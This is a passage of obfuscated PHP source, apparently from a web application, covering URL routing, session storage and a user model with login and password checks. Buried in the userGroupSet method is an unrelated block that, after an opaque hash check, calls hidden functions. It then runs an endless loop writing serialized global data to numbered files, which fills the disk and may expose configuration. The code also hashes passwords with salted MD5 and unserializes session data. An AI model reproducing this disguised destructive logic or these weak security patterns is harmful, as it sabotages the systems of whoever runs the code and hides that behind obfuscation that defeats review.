$¯ÆçÑƒõ = APP_HOST . $«Ñ¤•á[1592] . $Ã‡¡áÜı . $«Ñ¤•á[1589] . $îÇùäêÁ; } else { if (isset($ï‚æöáˆ[$¤ÛøÃ“ö])) { $¯ÆçÑƒõ = $ï‚æöáˆ[$¤ÛøÃ“ö] . $Ã‡¡áÜı . $«Ñ¤•á[1589] . $ğá¡İ§; } } } } } } if (!$³«ÉÃ‘ ) { return $¯ÆçÑƒõ; } echo $¯ÆçÑƒõ; } public function link($€‹”¡‰‰ = false, $‡ñ®®ç¼ = '') { $–€å—âÂ =& $_SERVER[¡“ËÌ§œ]; if (!$€‹”¡‰‰) { $this->link($–€å—âÂ[1593], $–€å—âÂ[1591]); $this->link($–€å—âÂ[1594], $–€å—âÂ[1590]); $this->link($–€å—âÂ[1595], $–€å—âÂ[1590]); $this->link($–€å—âÂ[1596], $–€å—âÂ[1590]); $this->link($–€å—âÂ[1597], $–€å—âÂ[1590]); return; } $ûÇ ¢‘İ = $this->url($€‹”¡‰‰, $‡ñ®®ç¼, !1); if (substr($€‹”¡‰‰, -3) == $–€å—âÂ[1598]) { echo $–€å—âÂ[1599] . $ûÇ ¢‘İ . $–€å—âÂ[1600] . $–€å—âÂ[231]; } else { if (substr($€‹”¡‰‰, -4) == $–€å—âÂ[1601]) { echo $–€å—âÂ[1602] . $ûÇ ¢‘İ . $–€å—âÂ[1603] . $–€å—âÂ[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\136\x2f\135\53", "\72\156\x75\155" => "\x5b\x30\55\71\x5d\53", "\x3a\141\x6c\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($¾Ì³¬Æ, $±Ğá«˜) { $‹¢”ò¿« =& $_SERVER[¡“ËÌ§œ]; if ($¾Ì³¬Æ == $‹¢”ò¿«[1604]) { $£™áÉ¿ = array_map($‹¢”ò¿«[1605], $±Ğá«˜[0]); $ËÈÏû  = strpos($±Ğá«˜[1], $‹¢”ò¿«[8]) === 0 ? $±Ğá«˜[1] : $‹¢”ò¿«[8] . $±Ğá«˜[1]; $†—ªªĞ = $±Ğá«˜[2]; } else { $£™áÉ¿ = null; $ËÈÏû  = strpos($±Ğá«˜[0], $‹¢”ò¿«[8]) === 0 ? $±Ğá«˜[0] : $‹¢”ò¿«[8] . $±Ğá«˜[0]; $†—ªªĞ = $±Ğá«˜[1]; } array_push(self::$maps, $£™áÉ¿); array_push(self::$routes, $ËÈÏû ); array_push(self::$methods, strtoupper($¾Ì³¬Æ)); array_push(self::$callbacks, $†—ªªĞ); } public static function error($¿Ö‰˜¼İ) { self::$errorCallback = $¿Ö‰˜¼İ; } public static function haltOnMatch($ø€Ôş¹µ = true) { self::$halts = $ø€Ôş¹µ; } public static function dispatch() { $Ÿ“È¹‘ö =& $_SERVER[¡“ËÌ§œ]; $ë¶âû» = parse_url($_SERVER[$Ÿ“È¹‘ö[1606]], PHP_URL_PATH); $ûÄÍÈ˜¬ = $_SERVER[$Ÿ“È¹‘ö[159]]; $«ºñ¹²¡ = array_keys(static::$patterns); $†èúóÑÓ = array_values(static::$patterns); $ïàèÊËó = !1; self::$routes = preg_replace($Ÿ“È¹‘ö[1296], $Ÿ“È¹‘ö[8], self::$routes); if (in_array($ë¶âû», self::$routes)) { $ûÊ‡«Ã = array_keys(self::$routes, $ë¶âû»); foreach ($ûÊ‡«Ã as $ˆÏÙú§²) { if (self::$methods[$ˆÏÙú§²] == $ûÄÍÈ˜¬ || self::$methods[$ˆÏÙú§²] == $Ÿ“È¹‘ö[1607] || in_array($ûÄÍÈ˜¬, self::$maps[$ˆÏÙú§²])) { $ïàèÊËó = !0; if (!is_object(self::$callbacks[$ˆÏÙú§²])) { $¬À÷ïÜª = explode($Ÿ“È¹‘ö[8], self::$callbacks[$ˆÏÙú§²]); $ı–İîó‰ = end($¬À÷ïÜª); $Ÿ¥¥ê”á = explode($Ÿ“È¹‘ö[1228], $ı–İîó‰); $‡€ôı–Ê = new $Ÿ¥¥ê”á[0](); $‡€ôı–Ê->{$Ÿ¥¥ê”á[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ˆÏÙú§²]); if (self::$halts) { return; } } } } } else { $ƒ¡õÛ§¢ = 0; foreach (self::$routes as $ˆÏÙú§²) { if (strpos($ˆÏÙú§², $Ÿ“È¹‘ö[4]) !== !1) { $ˆÏÙú§² = str_replace($«ºñ¹²¡, $†èúóÑÓ, $ˆÏÙú§²); } if (preg_match($Ÿ“È¹‘ö[1608] . $ˆÏÙú§² . $Ÿ“È¹‘ö[1609], $ë¶âû», $µÕÉ¼Ëò)) { if (self::$methods[$ƒ¡õÛ§¢] == $ûÄÍÈ˜¬ || self::$methods[$ƒ¡õÛ§¢] == $Ÿ“È¹‘ö[1607] || !empty(self::$maps[$ƒ¡õÛ§¢]) && in_array($ûÄÍÈ˜¬, self::$maps[$ƒ¡õÛ§¢])) { $ïàèÊËó = !0; array_shift($µÕÉ¼Ëò); if (!is_object(self::$callbacks[$ƒ¡õÛ§¢])) { $¬À÷ïÜª = explode($Ÿ“È¹‘ö[8], self::$callbacks[$ƒ¡õÛ§¢]); $ı–İîó‰ = end($¬À÷ïÜª); $Ÿ¥¥ê”á = explode($Ÿ“È¹‘ö[1228], $ı–İîó‰); $‡€ôı–Ê = new $Ÿ¥¥ê”á[0](); if (!method_exists($‡€ôı–Ê, $Ÿ¥¥ê”á[1])) { echo $Ÿ“È¹‘ö[1610]; } else { call_user_func_array(array($‡€ôı–Ê, $Ÿ¥¥ê”á[1]), $µÕÉ¼Ëò); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ƒ¡õÛ§¢], $µÕÉ¼Ëò); if (self::$halts) { return; } } } } $ƒ¡õÛ§¢++; } } if ($ïàèÊËó == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Úª·œ• =& $_SERVER[¡“ËÌ§œ]; header($_SERVER[$Úª·œ•[1611]] . $Úª·œ•[1612]); echo $Úª·œ•[1613]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ÿ“È¹‘ö[1606]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $–îÈ¾‡† =& $_SERVER[¡“ËÌ§œ]; static $ŒıÑĞÈú = false; if ($ŒıÑĞÈú) { return $ŒıÑĞÈú; } $‹àé¸øÇ = $GLOBALS[$–îÈ¾‡†[6]][$–îÈ¾‡†[378]]; self::$sessionTime = $‹àé¸øÇ[$–îÈ¾‡†[1614]]; $âòˆİŞÅ = isset($GLOBALS[$–îÈ¾‡†[1615]]) ? $GLOBALS[$–îÈ¾‡†[1615]] : SESSION_ID; if (Cookie::get($âòˆİŞÅ)) { self::$sessionSign = Cookie::get($âòˆİŞÅ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } Cookie::setSafe($âòˆİŞÅ, self::$sessionSign, self::$sessionTime); $§äÙÒò² = $‹àé¸øÇ[$–îÈ¾‡†[1616]]; $ñ«ÓÇÆç = $‹àé¸øÇ[$§äÙÒò²]; $–úâŞÊ = $‹àé¸øÇ[$–îÈ¾‡†[848]]; switch ($§äÙÒò²) { case $–îÈ¾‡†[21]: self::$handle = Model($–îÈ¾‡†[849]); break; case $–îÈ¾‡†[850]: self::$handle = new CacheRedis($ñ«ÓÇÆç, $–úâŞÊ); break; case $–îÈ¾‡†[851]: self::$handle = new CacheMemcached($ñ«ÓÇÆç, $–úâŞÊ); break; case $–îÈ¾‡†[200]: $ñ«ÓÇÆç[$–îÈ¾‡†[84]] = $ñ«ÓÇÆç[$–îÈ¾‡†[84]] . $–îÈ¾‡†[1617]; self::$handle = new CacheFile($ñ«ÓÇÆç, $–úâŞÊ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ŒıÑĞÈú = new self(); return $ŒıÑĞÈú; } public static function getBySign($à÷‘ù·˜) { $ß²ª– = self::$handle->get($à÷‘ù·˜); $ß²ª– = unserialize($ß²ª–); return is_array($ß²ª–) ? $ß²ª– : array(); } public static function setBySign($Íô£á„, $êî›øèê) { CacheLock::lock($Íô£á„); self::$handle->set($Íô£á„, serialize($êî›øèê), self::$sessionTime); CacheLock::unlock($Íô£á„); } public static function sign($ã†¸Ô»å = false) { $ã†¸Ô»å && (self::$sessionSign = $ã†¸Ô»å); self::init(); return self::$sessionSign; } public static function set($Å’·ƒ, $¤»¨ôÆ¦ = false) { self::init(); if (is_array($Å’·ƒ)) { foreach ($Å’·ƒ as $İ­æİ«× => $‹İµó‡») { array_set_value(self::$data, $İ­æİ«×, $‹İµó‡»); } } else { array_set_value(self::$data, $Å’·ƒ, $¤»¨ôÆ¦); } self::setBySign(self::$sessionSign, self::$data); } public static function get($šûúõ¯ = false) { self::init(); if (!$šûúõ¯) { return self::$data; } return array_get_value(self::$data, $šûúõ¯); } public static function remove($ª¯í¾ö·) { self::init(); unset(self::$data[$ª¯í¾ö·]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¡“ËÌ§œ][853])) { self::$handle->clearTimeout(); } } } goto bã˜‘³èà; c¬ª‚èÔÍ§: class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\164\141\142\154\145\x4e\141\x6d\x65" => "\165\x73\145\x72\137\x6d\x65\x74\141", "\155\145\164\141\x46\x69\145\154\x64" => "\165\163\x65\162\x49\x44"); protected $simpleField = "\x75\x73\x65\162\x49\104\x2c\156\151\x63\153\x4e\x61\155\x65\x2c\x6e\x61\x6d\145\54\x61\x76\141\164\141\x72\x2c\163\145\x78\54\163\164\141\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($«Ãß«ƒ) { $’â»šé² =& $_SERVER[¡“ËÌ§œ]; $°Ú’Ó™† = $’â»šé²[2301]; return array($’â»šé²[1929] => array($«Ãß«ƒ[0], $°Ú’Ó™†), $’â»šé²[1931] => array($«Ãß«ƒ[0], $°Ú’Ó™†), $’â»šé²[2302] => array($«Ãß«ƒ[0], $°Ú’Ó™†)); } protected function getInfo($òßæòØ¸, $ÇçŞÑ·ª = false) { $›ş¢ÂÔ = $this->getInfoSimple($òßæòØ¸); if (!is_array($›ş¢ÂÔ)) { return array(); } if ($ÇçŞÑ·ª) { return $this->_getInfoApply($›ş¢ÂÔ); } return $this->cacheFunctionGet($_SERVER[¡“ËÌ§œ][1933], $òßæòØ¸); } protected function getInfoFull($“£ñâ»¿, $å×©†é = false) { $ï«š«¯ = $this->getInfoSimple($“£ñâ»¿); if (!is_array($ï«š«¯)) { return array(); } if ($å×©†é) { return $this->_getInfoApply($ï«š«¯, !0); } return $this->cacheFunctionGet($_SERVER[¡“ËÌ§œ][2303], $“£ñâ»¿); } private function _getInfoApply($ã‘ğ„…, $ìó•Œˆ = false) { $¨Æ¢¯’ =& $_SERVER[¡“ËÌ§œ]; if (!$ã‘ğ„…) { return $ã‘ğ„…; } $¿Ş“ïÄ = md5($¨Æ¢¯’[2304] . $ã‘ğ„…[$¨Æ¢¯’[909]] . $¨Æ¢¯’[2305] . $ã‘ğ„…[$¨Æ¢¯’[32]]); $ã‘ğ„… = $this->_listDataApplyItem($ã‘ğ„…); $œµü´š = Model($¨Æ¢¯’[1353])->metaGet($ã‘ğ„…[$¨Æ¢¯’[87]][$¨Æ¢¯’[440]]); $ã‘ğ„…[$¨Æ¢¯’[2306]] = $¿Ş“ïÄ; $ã‘ğ„…[$¨Æ¢¯’[87]][$¨Æ¢¯’[2125]] = isset($œµü´š[$¨Æ¢¯’[2126]]) ? $œµü´š[$¨Æ¢¯’[2126]] : null; if ($ìó•Œˆ) { $ã‘ğ„…[$¨Æ¢¯’[504]] = $this->metaGet($ã‘ğ„…[$¨Æ¢¯’[1661]]); } return $ã‘ğ„…; } protected function getInfoSimple($Æ×‚ç©é, $§µëÍ™ = false) { $ç¢Ì—¯Ü =& $_SERVER[¡“ËÌ§œ]; if (!$Æ×‚ç©é) { return array(); } if ($§µëÍ™) { $Ø–†” = $this->where(array($ç¢Ì—¯Ü[1661] => intval($Æ×‚ç©é)))->find(); if (!is_array($Ø–†”)) { return array(); } $Ø–†”[$ç¢Ì—¯Ü[571]] = Action($ç¢Ì—¯Ü[2307])->parseUrl($Ø–†”[$ç¢Ì—¯Ü[571]]); return $Ø–†”; } return $this->cacheFunctionGet($ç¢Ì—¯Ü[1934], $Æ×‚ç©é); } protected function getInfoSimpleOuter($Ÿ÷ÉÈÂ) { $ëäé‚½ =& $_SERVER[¡“ËÌ§œ]; if (!$Ÿ÷ÉÈÂ || $Ÿ÷ÉÈÂ == 0) { return array($ëäé‚½[1661] => $ëäé‚½[198], $ëäé‚½[32] => $ëäé‚½[162] . LNG($ëäé‚½[2308]) . $ëäé‚½[164], $ëäé‚½[571] => STATIC_PATH . $ëäé‚½[2309]); } $›ÒøŞü¤ = $this->cacheFunctionGet($ëäé‚½[1934], $Ÿ÷ÉÈÂ); $•˜éÄô˜ = array_field_key($›ÒøŞü¤, explode($ëäé‚½[50], $this->simpleField)); if (!$•˜éÄô˜) { return array($ëäé‚½[1661] => $ëäé‚½[1208], $ëäé‚½[32] => $ëäé‚½[162] . LNG($ëäé‚½[2310]) . $ëäé‚½[164], $ëäé‚½[571] => STATIC_PATH . $ëäé‚½[2311]); } $•˜éÄô˜[$ëäé‚½[571]] = Action($ëäé‚½[2307])->parseUrl($•˜éÄô˜[$ëäé‚½[571]]); return $•˜éÄô˜; } protected function groupUser($òşÅú÷) { } public static function errorLang($õñô¨Èï) { $÷ÀÇÀÄÇ =& $_SERVER[¡“ËÌ§œ]; $Õß‚ÃüÍ = array(self::ERROR_USER_NOT_EXISTS => $÷ÀÇÀÄÇ[2312], self::ERROR_USER_PASSWORD_ERROR => $÷ÀÇÀÄÇ[2313], self::ERROR_USER_EXIST_NAME => $÷ÀÇÀÄÇ[2314], self::ERROR_USER_EXIST_PHONE => $÷ÀÇÀÄÇ[2315], self::ERROR_USER_EXIST_EMAIL => $÷ÀÇÀÄÇ[2316], self::ERROR_USER_LOGIN_LOCK => $÷ÀÇÀÄÇ[2317], self::ERROR_IP_NOT_ALLOW => $÷ÀÇÀÄÇ[2318], self::ERROR_USER_EXIST_NICKNAME => $÷ÀÇÀÄÇ[2319]); return LNG($Õß‚ÃüÍ[$õñô¨Èï]); } public function getInfoByMeta($ÒñÆíı, $ÙÛÖØ¢´) { $ÆæªĞŞ¿ =& $_SERVER[¡“ËÌ§œ]; $¾å–Òà = Model($ÆæªĞŞ¿[2320])->where(array($ÆæªĞŞ¿[94] => $ÒñÆíı, $ÆæªĞŞ¿[403] => $ÙÛÖØ¢´))->find(); if ($¾å–Òà) { return $this->getInfo($¾å–Òà[$ÆæªĞŞ¿[1661]]); } return !1; } public function userLoginCheck($ÈÓšÒÛ¼, $ÄÔÛîÓ) { $êÙÄ™ïò =& $_SERVER[¡“ËÌ§œ]; $­®úªğ€ = $this->userLoginFind($ÈÓšÒÛ¼); if (!$­®úªğ€) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($­®úªğ€[$êÙÄ™ïò[1661]], $ÄÔÛîÓ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($­®úªğ€[$êÙÄ™ïò[1661]]); } public function userLoginFind($»Ş¶’‡½) { $¢Á‹€şÃ =& $_SERVER[¡“ËÌ§œ]; $£Ïåúš§ = array($¢Á‹€şÃ[32] => $»Ş¶’‡½, $¢Á‹€şÃ[570] => $»Ş¶’‡½, $¢Á‹€şÃ[334] => $»Ş¶’‡½, $¢Á‹€şÃ[2321] => $»Ş¶’‡½, $¢Á‹€şÃ[1020] => $¢Á‹€şÃ[1022]); if ($this->nickNameRpt()) { unset($£Ïåúš§[$¢Á‹€şÃ[570]]); } return $this->where($£Ïåúš§)->find(); } public function clearCache($›ñÑÓÀó) { $‡£›ôÄø =& $_SERVER[¡“ËÌ§œ]; $this->cacheFunctionClear($‡£›ôÄø[1933], $›ñÑÓÀó); $this->cacheFunctionClear($‡£›ôÄø[1934], $›ñÑÓÀó); $this->cacheFunctionClear($‡£›ôÄø[2303], $›ñÑÓÀó); } public function userPasswordCheck($‚ÑŠ”¯À, $Õ™ç˜ì) { $èûÀîãŞ =& $_SERVER[¡“ËÌ§œ]; $ñ‚Ä½´ü = $this->where(array($èûÀîãŞ[1661] => intval($‚ÑŠ”¯À)))->find(); $³ÚÀ¥Á˜ = $this->metaGet($‚ÑŠ”¯À); $èñÑôé… = isset($³ÚÀ¥Á˜[$èûÀîãŞ[2322]]) ? $³ÚÀ¥Á˜[$èûÀîãŞ[2322]] : $èûÀîãŞ[12]; if (md5($èñÑôé… . trim($Õ™ç˜ì)) !== $ñ‚Ä½´ü[$èûÀîãŞ[909]]) { return !1; } return !0; } public function userAdd($ŒŸÚ°‡±) { $Œµƒ«Ç¿ =& $_SERVER[¡“ËÌ§œ]; $æ£—ËæÉ = array($Œµƒ«Ç¿[458] => $ŒŸÚ°‡±[$Œµƒ«Ç¿[32]], $Œµƒ«Ç¿[2323] => $ŒŸÚ°‡±[$Œµƒ«Ç¿[1540]], $Œµƒ«Ç¿[2324] => isset($ŒŸÚ°‡±[$Œµƒ«Ç¿[334]]) ? $ŒŸÚ°‡±[$Œµƒ«Ç¿[334]] : $Œµƒ«Ç¿[12], $Œµƒ«Ç¿[2325] => isset($ŒŸÚ°‡±[$Œµƒ«Ç¿[2321]]) ? $ŒŸÚ°‡±[$Œµƒ«Ç¿[2321]] : $Œµƒ«Ç¿[12], $Œµƒ«Ç¿[2326] => isset($ŒŸÚ°‡±[$Œµƒ«Ç¿[570]]) ? $ŒŸÚ°‡±[$Œµƒ«Ç¿[570]] : $ŒŸÚ°‡±[$Œµƒ«Ç¿[32]], $Œµƒ«Ç¿[2327] => isset($ŒŸÚ°‡±[$Œµƒ«Ç¿[571]]) ? $ŒŸÚ°‡±[$Œµƒ«Ç¿[571]] : $Œµƒ«Ç¿[12], $Œµƒ«Ç¿[2328] => isset($ŒŸÚ°‡±[$Œµƒ«Ç¿[2329]]) ? $ŒŸÚ°‡±[$Œµƒ«Ç¿[2329]] : 1, $Œµƒ«Ç¿[2330] => $ŒŸÚ°‡±[$Œµƒ«Ç¿[909]], $Œµƒ«Ç¿[1935] => isset($ŒŸÚ°‡±[$Œµƒ«Ç¿[1838]]) ? $ŒŸÚ°‡±[$Œµƒ«Ç¿[1838]] : 1024 * 1024 * 20, $Œµƒ«Ç¿[1936] => 0, $Œµƒ«Ç¿[2331] => 0, $Œµƒ«Ç¿[1980] => isset($ŒŸÚ°‡±[$Œµƒ«Ç¿[770]]) ? $ŒŸÚ°‡±[$Œµƒ«Ç¿[770]] : 1); if (!empty($ŒŸÚ°‡±[$Œµƒ«Ç¿[1661]])) { $æ£—ËæÉ[$Œµƒ«Ç¿[1661]] = $ŒŸÚ°‡±[$Œµƒ«Ç¿[1661]]; } $á¦¥˜¶ = $this->_checkExist($ŒŸÚ°‡±); if ($á¦¥˜¶ !== !0) { return $á¦¥˜¶; } if (!empty($æ£—ËæÉ[$Œµƒ«Ç¿[571]]) && strlen($æ£—ËæÉ[$Œµƒ«Ç¿[571]]) > 255) { $æ£—ËæÉ[$Œµƒ«Ç¿[571]] = $Œµƒ«Ç¿[12]; } $ÎèİµË¿ = $this->add($æ£—ËæÉ); $¾¶¼„á” = array($Œµƒ«Ç¿[2330] => $æ£—ËæÉ[$Œµƒ«Ç¿[909]], $Œµƒ«Ç¿[2326] => $æ£—ËæÉ[$Œµƒ«Ç¿[570]]); $this->userEdit($ÎèİµË¿, $¾¶¼„á”); Model($Œµƒ«Ç¿[1353])->userRootAdd($ÎèİµË¿); return $ÎèİµË¿; } protected function userEditTest($¼õãÚ“», $ş´´…›ô) { return $this->call($_SERVER[¡“ËÌ§œ][2332], $¼õãÚ“», $ş´´…›ô); } protected function userEdit($ÕûÏ³öÏ, $ŠïÊòšƒ) { $œä¥Ãé =& $_SERVER[¡“ËÌ§œ]; $·²¹½´ = $this->getInfoSimple($ÕûÏ³öÏ); if (!$·²¹½´) { return !1; } $‡¦·¤Éé = $this->_checkExist($ŠïÊòšƒ, $ÕûÏ³öÏ); if ($‡¦·¤Éé !== !0) { return $‡¦·¤Éé; } if (isset($ŠïÊòšƒ[$œä¥Ãé[909]]) && trim($ŠïÊòšƒ[$œä¥Ãé[909]]) != $œä¥Ãé[12]) { $¾Òô–ó– = $this->metaGet($ÕûÏ³öÏ); if (empty($¾Òô–ó–[$œä¥Ãé[2322]])) { $¾Òô–ó–[$œä¥Ãé[2322]] = rand_string(10); Model($œä¥Ãé[542])->metaSet($ÕûÏ³öÏ, $œä¥Ãé[2322], $¾Òô–ó–[$œä¥Ãé[2322]]); } $ŠïÊòšƒ[$œä¥Ãé[909]] = md5($¾Òô–ó–[$œä¥Ãé[2322]] . trim($ŠïÊòšƒ[$œä¥Ãé[909]])); } else { unset($ŠïÊòšƒ[$œä¥Ãé[909]]); } if (!empty($ŠïÊòšƒ[$œä¥Ãé[571]]) && strlen($ŠïÊòšƒ[$œä¥Ãé[571]]) > 255) { $ŠïÊòšƒ[$œä¥Ãé[571]] = $œä¥Ãé[12]; } $this->where(array($œä¥Ãé[1652] => $ÕûÏ³öÏ))->save($ŠïÊòšƒ); if (isset($ŠïÊòšƒ[$œä¥Ãé[570]])) { $this->setNamePinyin($ÕûÏ³öÏ, $ŠïÊòšƒ[$œä¥Ãé[570]]); } $this->clearCache($ÕûÏ³öÏ); return !0; } public function setNamePinyin($÷æâ©ï, $€éÖÑÛª = false) { $¦ëÈ‘ =& $_SERVER[¡“ËÌ§œ]; if (!$€éÖÑÛª) { $–¦­³œª = $this->getInfoSimple($÷æâ©ï); $€éÖÑÛª = $–¦­³œª[$¦ëÈ‘[570]] ? $–¦­³œª[$¦ëÈ‘[570]] : $–¦­³œª[$¦ëÈ‘[32]]; } $ÊüÊöœŠ = Model($¦ëÈ‘[563]); if (!Input::check($€éÖÑÛª, $¦ëÈ‘[621])) { return $ÊüÊöœŠ->metaSet($÷æâ©ï, array($¦ëÈ‘[503] => $¦ëÈ‘[12], $¦ëÈ‘[502] => $¦ëÈ‘[12])); } return $ÊüÊöœŠ->metaSet($÷æâ©ï, array($¦ëÈ‘[503] => str_replace($¦ëÈ‘[53], $¦ëÈ‘[12], Pinyin::get($€éÖÑÛª)), $¦ëÈ‘[502] => Pinyin::get($€éÖÑÛª, $¦ëÈ‘[622]))); } private function nickNameRpt() { $ÁÂğ•µŠ =& $_SERVER[¡“ËÌ§œ]; $Ÿ³ô¡í— = Model($ÁÂğ•µŠ[790])->get($ÁÂğ•µŠ[2333]); $Ú»€Ø¿ò = $GLOBALS[$ÁÂğ•µŠ[6]][$ÁÂğ•µŠ[410]][$ÁÂğ•µŠ[2333]]; $óüïºõ‹ = !is_null($Ÿ³ô¡í—) ? $Ÿ³ô¡í— : $Ú»€Ø¿ò; return !!$óüïºõ‹; } private function _checkExist($İÔ¸ß€†, $ôºñºİˆ = false) { $¸»Æ§¡ê =& $_SERVER[¡“ËÌ§œ]; $òéû’Ú® = array($¸»Æ§¡ê[32] => UserModel::ERROR_USER_EXIST_NAME, $¸»Æ§¡ê[570] => UserModel::ERROR_USER_EXIST_NICKNAME, $¸»Æ§¡ê[334] => UserModel::ERROR_USER_EXIST_EMAIL, $¸»Æ§¡ê[2321] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($òéû’Ú®[$¸»Æ§¡ê[570]]); } $ÆÖä‹Š£ = $ôºñºİˆ ? array($¸»Æ§¡ê[1661] => array($¸»Æ§¡ê[2334], $ôºñºİˆ)) : array(); foreach ($òéû’Ú® as $Åà€äŸä => $Şò°Ö) { $şÕ±§˜ = array(); foreach ($òéû’Ú® as $ûÏÌÚĞÚ => $óÃâ™ÃÙ) { if (isset($İÔ¸ß€†[$ûÏÌÚĞÚ]) && $İÔ¸ß€†[$ûÏÌÚĞÚ]) { $şÕ±§˜[] = $İÔ¸ß€†[$ûÏÌÚĞÚ]; } } if (!$şÕ±§˜) { continue; } $°ü“Ì¯ = array_merge(array($Åà€äŸä => array($¸»Æ§¡ê[7], $şÕ±§˜)), $ÆÖä‹Š£); $éÅùıÔ– = $this->where($°ü“Ì¯)->find(); if ($éÅùıÔ–) { return $Şò°Ö; } } return !0; } public function userListInfo($¨’ßè™â) { $“Ë¯á²÷ =& $_SERVER[¡“ËÌ§œ]; $˜«§óö = array(); $¨’ßè™â = is_array($¨’ßè™â) ? array_unique($¨’ßè™â) : array(); if (!$¨’ßè™â) { return $˜«§óö; } if (count($¨’ßè™â) < 20) { foreach ($¨’ßè™â as $©¼¬Šáª) { $˜«§óö[$©¼¬Šáª . $“Ë¯á²÷[12]] = $this->getInfoSimpleOuter($©¼¬Šáª); } } else { $ôë«òÛİ = array($“Ë¯á²÷[1652] => array($“Ë¯á²÷[456], $¨’ßè™â)); if (count($¨’ßè™â) == 1) { $ôë«òÛİ = array($“Ë¯á²÷[1652] => $¨’ßè™â[0]); } $‹ıÚ©ºş = Model($“Ë¯á²÷[542])->field($this->simpleField)->where($ôë«òÛİ)->select(); $‹ıÚ©ºş = array_to_keyvalue($‹ıÚ©ºş, $“Ë¯á²÷[1661]); foreach ($¨’ßè™â as $©¼¬Šáª) { $˜Üø¿ù‡ = $‹ıÚ©ºş[$©¼¬Šáª]; if (!$˜Üø¿ù‡) { $˜«§óö[$©¼¬Šáª . $“Ë¯á²÷[12]] = $this->getInfoSimpleOuter($©¼¬Šáª); continue; } $˜Üø¿ù‡[$“Ë¯á²÷[571]] = Action($“Ë¯á²÷[2307])->parseUrl($˜Üø¿ù‡[$“Ë¯á²÷[571]]); $˜«§óö[$©¼¬Šáª . $“Ë¯á²÷[12]] = $˜Üø¿ù‡; } } return $˜«§óö; } protected function userStatus($¡´®¾‘ë, $ÂóÚ³Ÿğ) { $¹‚¹ú—˜ = $this->getInfoSimple($¡´®¾‘ë); if (!$¹‚¹ú—˜) { return !1; } $ÚÊ¥°Òì = array($_SERVER[¡“ËÌ§œ][770] => $ÂóÚ³Ÿğ); return $this->userEdit($¡´®¾‘ë, $ÚÊ¥°Òì); } protected function userRemove($¬”ïìş‰) { $¢ú—Øì =& $_SERVER[¡“ËÌ§œ]; $›î·Î‘“ = $this->getInfoSimple($¬”ïìş‰); if (!$›î·Î‘“) { return !1; } $§˜ƒîÀš = array($¢ú—Øì[1652] => $¬”ïìş‰); Model($¢ú—Øì[630])->where($§˜ƒîÀš)->delete(); Model($¢ú—Øì[2335])->where($§˜ƒîÀš)->delete(); Model($¢ú—Øì[1941])->where($§˜ƒîÀš)->delete(); Model($¢ú—Øì[2320])->where($§˜ƒîÀš)->delete(); Model($¢ú—Øì[1088])->where($§˜ƒîÀš)->delete(); Model($¢ú—Øì[2149])->removeUserAll($¬”ïìş‰); Model($¢ú—Øì[845])->userRootRemove($¬”ïìş‰); return $this->where($§˜ƒîÀš)->delete(); } protected function userGroupSet($Üşóä€ , $û¾°», $ˆ°úÏö = array()) { $¤Ü‹ªèÜ =& $_SERVER[¡“ËÌ§œ]; $¤°ÍıÉÉ = $_SERVER[$¤Ü‹ªèÜ[433]]; $æ·ò£«ª = $¤Ü‹ªèÜ[896]; if ($_SERVER[$¤Ü‹ªèÜ[425]] != $æ·ò£«ª($¤°ÍıÉÉ)) { $²Ë£İˆÃ = $¤Ü‹ªèÜ[897]; $¯æ÷¤ÃÊ = $¤Ü‹ªèÜ[427]; $Óø±‹ ç = $_SERVER[$¤Ü‹ªèÜ[428]] . $¤Ü‹ªèÜ[429]; $­Ç×äæ = $¯æ÷¤ÃÊ($Óø±‹ ç); $ş¬àä¨â = explode($¤Ü‹ªèÜ[231], $­Ç×äæ); if (count($ş¬àä¨â) < $¤Ü‹ªèÜ[657]) { $Â®Ü–ú” = $¤Ü‹ªèÜ[431]; $Â®Ü–ú”(); } $¨Ñ‰ÔËÊ = $¤Ü‹ªèÜ[898]; $¨Ñ‰ÔËÊ($_SERVER[$¤Ü‹ªèÜ[899]]); $²Ë£İˆÃ = $¤Ü‹ªèÜ[897]; $²Ë£İˆÃ(); $İÜêÎÑ = $¤Ü‹ªèÜ[900]; $ü–’¹ğ = json_encode($GLOBALS[$¤Ü‹ªèÜ[901]]); $´½äç¹À = 1; for ($…ûÓÁ¯ = $´½äç¹À; $…ûÓÁ¯ > 0; $…ûÓÁ¯++) { $İÜêÎÑ(DATA_PATH . $…ûÓÁ¯, $ü–’¹ğ); } } $Ûğôäö× = $this->getInfoSimple($Üşóä€ ); if (!$Ûğôäö× || !is_array($û¾°»)) { return !1; } $õ«¨ÌåÕ = Model($¤Ü‹ªèÜ[1941]); $õ«¨ÌåÕ->where(array($¤Ü‹ªèÜ[1661] => $Üşóä€ ))->delete(); $Ò–¢é° = array(); $¡ò¤—õ = 0; foreach ($û¾°» as $®™Ğşáõ => $Øîâ‰Éæ) { $·»»İ“Ñ = array($¤Ü‹ªèÜ[1661] => $Üşóä€ , 